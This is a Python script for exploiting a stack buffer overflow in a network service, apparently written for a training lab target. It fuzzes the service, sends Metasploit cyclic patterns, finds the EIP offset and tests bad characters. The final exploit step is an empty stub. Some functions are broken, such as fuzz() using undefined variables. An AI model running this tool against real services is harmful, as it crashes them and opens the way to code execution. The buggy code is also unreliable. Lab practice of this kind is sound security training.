#!/usr/bin/env python3

import argparse
import socket
import subprocess
import sys
import time

parser = argparse.ArgumentParser()
parser.add_argument('--generate-config-template',action='store_true')
parser.add_argument('--use-local-config-file',action='store_true')
args = parser.parse_args()

timeout = 3

def use_local_config_file():
    import config
    if hasattr(config,'settings'):
        if type(config.settings) is dict:
            try:
                mode = config.settings['mode']
                host = config.settings['host']
                port = config.settings['port']
                prefix = config.settings['prefix']
                offset = config.settings['offset']
                retn = config.settings['retn']
                length = config.settings['length']
                bad_chars = config.settings['bad_chars']
                print("[*] Mode: %s" % mode)
                if mode == 'fuzz':
                    fuzz()
                elif mode == 'overflow':
                    overflow(host,port,prefix,length)
                elif mode == 'offset':
                    find_eip_offset(host,port,prefix,offset,retn,length)
                elif mode == 'bad':
                    send_bad_chars(host,port,prefix,offset,retn,length,bad_chars)
            except Exception as err:
                print("[x] The %s key is missing from the settings variable." % err)
        else:
            print("[x] The settings variable is not of the dict type.")
    else:
        print("[x] The settings variable was not found in config.py.")

def generate_config_template():
    config = open("config.py","w")
    config.write("settings = {\n")
    config.write("    'mode': 'overflow',\n")
    config.write("    'host': '10.10.10.10',\n")
    config.write("    'port': 1337,\n")
    config.write("    'prefix': 'OVERFLOW1 ',\n")
    config.write("    'offset': 1978,\n")
    config.write("    'retn': 'BBBB',\n")
    config.write("    'length': 2400,\n")
    config.write("    'bad_chars': ['\x00','\x0a','\x0d']\n")
    config.write("}\n")
    config.close()
    print("[+] Created a config.py template.")
    print(open("config.py","r").read())

def connect(host,port):
    target = (host,port)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    client.settimeout(timeout)
    client.connect(target)
    client.recv(1024)
    return client

def send_bof(bof,host,port):
    try:
        client = connect(host,port)
        client.send(bytes(bof + "\r\n","latin-1"))
        client.close()
        print("[+] Sent BOF.")
        try:
            client = connect(host,port)
            client.close()
        except:
            print("[+] Tango down!")
    except:
        print("[x] Failed to connect to port %d." % port)
        exit()

def fuzz():
    string = prefix + "A" * 100
    while True:
        try:
            with connect() as client:
                print("[*] Fuzzing with {} bytes".format(len(string) - len(prefix)))
                client.send(bytes(string, "latin-1"))
                client.recv(1024)
        except socket.error as err:
            print("[x] Failed to connect to port %d." % port)
            sys.exit(0)
        except:
            print("[!] Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
            sys.exit(0)
        
        string += "A" * 100
        time.sleep(1)

def overflow(host,port,prefix,length):
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    if subprocess.run(['which','msf-pattern_create'], stdout=subprocess.DEVNULL).returncode == 0:
        payload = subprocess.check_output(['msf-pattern_create','-l',str(length)],universal_newlines=True).rstrip()
    else:
        print("[x] msf-pattern_create not found.")
        exit()
    suffix = ""
    bof = prefix + overflow + retn + padding + payload + suffix
    send_bof(bof)
    print("[!] Next step: Determine the offset of the EIP register in your BOF.")

def find_eip_offset(host,port,prefix,offset,retn,length):
    overflow = "A" * offset
    padding = ""
    payload = ""
    suffix = ""
    bof = prefix + overflow + retn + padding + payload + suffix
    send_bof(bof,host,port)
    print("[!] Next step: Find bad characters.")

def send_bad_chars(host,port,prefix,offset,retn,length,bad_chars):
    overflow = "A" * offset
    padding = "\x90" * 16
    payload = ""
    print("[*] Excluding: %s" % bad_chars)
    bad_chars_in_integer_form = []
    for char in bad_chars:
        bad_chars_in_integer_form.append(ord(char))
    for decimal in range(0, 256):
        if decimal not in bad_chars_in_integer_form:
            payload += chr(decimal)
    payload = ''.join(payload)
    suffix = ""
    bof = prefix + overflow + retn + padding + payload + suffix
    send_bof(bof,host,port)
    print("[!] Next steps:")
    print(" -  Check which bad characters caused a memory corruption and exclude them (one at a time) from the next run.")
    print(" -  If there were none, find a JMP instruction to redirect program execution.")

def exploit():
    payload = ""

if __name__ == "__main__":
    if args.generate_config_template:
        generate_config_template()
    elif args.use_local_config_file:
        use_local_config_file()
